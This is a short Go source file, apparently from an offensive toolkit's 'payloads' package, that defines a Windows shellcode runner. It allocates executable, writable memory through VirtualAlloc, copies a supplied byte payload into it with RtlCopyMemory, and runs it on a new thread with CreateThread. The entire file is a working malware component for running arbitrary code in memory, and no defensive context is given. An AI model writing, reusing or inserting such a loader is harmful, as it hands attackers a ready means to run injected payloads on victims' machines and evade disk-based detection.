package payloads

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type Shellcode struct {
}

func (sc Shellcode) Run(payload_data []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	CreateThread := kernel32.NewProc("CreateThread")

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, _ := VirtualAlloc.Call(
		uintptr(0),
		uintptr(len(payload_data)),
		0x3000,
		0x40,
	)

	RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&payload_data[0])),
		uintptr(len(payload_data)),
	)

	CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	time.Sleep(2 * time.Second)
}
